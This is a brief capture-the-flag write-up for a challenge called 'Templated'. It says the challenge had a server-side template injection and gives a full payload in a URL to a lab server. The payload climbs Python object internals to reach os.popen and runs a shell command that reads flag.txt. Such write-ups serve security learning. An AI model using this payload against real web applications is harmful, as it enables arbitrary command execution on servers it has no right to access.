# Templated #
Solver: Tal Baraz
---------------
1. First, I Figured out that there is an SSTI.
2. Then, I searched up for the os directory.
```javascript
That's it:
http://159.65.18.5:32067/{{"".__class__.__base__.__subclasses__()[186].__init__.__globals__['sys'].modules['os'].popen(%22cat%20flag.txt%22).read()}}
```



